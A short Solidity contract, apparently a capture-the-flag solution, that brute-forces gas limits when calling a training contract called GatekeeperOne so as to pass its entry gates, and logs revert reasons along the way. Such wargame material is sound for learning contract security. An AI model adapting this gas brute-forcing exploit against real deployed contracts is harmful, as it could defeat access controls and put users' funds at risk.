// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneHacker {
    GatekeeperOne gatekeeper;
    uint256 constant gasCostOfGateOne = 140;
    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    // Tries a range of gas values and returns the first gas amount that worked (or 0 if none)
    function bruteForceEnter(bytes8 key, uint256 startIter, uint256 endIter) public returns (uint256) {
        uint256 base = 65528;
        for (uint256 i = startIter; i <= endIter; i++) {
            uint256 finalGas = base + gasCostOfGateOne + i;
            (bool success, bytes memory returndata) = address(gatekeeper).call{gas: finalGas}(abi.encodeWithSignature("enter(bytes8)", key));
            // emit DebugRevertReason(finalGas, "regular debug");
            if (success) {
                return uint256(finalGas);  // success, stop and return
            } else if (returndata.length > 0) {
                // Decode revert reason and emit event or store
                string memory reason = _getRevertMsg(returndata);
                emit DebugRevertReason(i, reason);
                // continue looping, do not revert here
            }
        }
        return uint256(0);
    }

    // Helper event to log revert reasons
    event DebugRevertReason(uint256 attempt, string reason);

    // Helper to decode revert reason from returndata
    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
        // If the returndata length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return "Transaction reverted silently";
        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }

    
}